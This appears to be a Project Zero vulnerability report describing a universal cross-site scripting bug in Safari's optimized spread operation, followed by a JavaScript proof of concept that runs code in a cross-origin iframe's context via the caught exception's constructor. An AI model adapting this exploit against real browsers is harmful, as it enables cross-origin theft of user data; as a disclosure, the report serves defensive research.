# UXSS via operationSpreadGeneric
### Reported by lokihardt@google.com, Jan 20 2017

Once a spread operation is optimized, the function |operationSpreadGeneric| will be called from then on. But operationSpreadGeneric's trying to get a JSGlobalObject from the argument of a spread operation.

It seems that that optimization is not implemented to the release version of Safari yet.

Tested on the Nighly 10.0.2(12602.3.12.0.1, r210957)

PoC:
```html
<body>
<script>

'use strict';

function spread(a) {
    return [...a];
}

let arr = Object.create([1, 2, 3, 4]);
for (let i = 0; i < 0x10000; i++) {
    spread(arr);
}

let f = document.body.appendChild(document.createElement('iframe'));
f.onload = () => {
    f.onload = null;

    try {
        spread(f.contentWindow);
    } catch (e) {
        e.constructor.constructor('alert(location)')();
    }
};

f.src = 'https://abc.xyz/';

</script>
</body>
```

https://bugs.chromium.org/p/project-zero/issues/detail?id=1094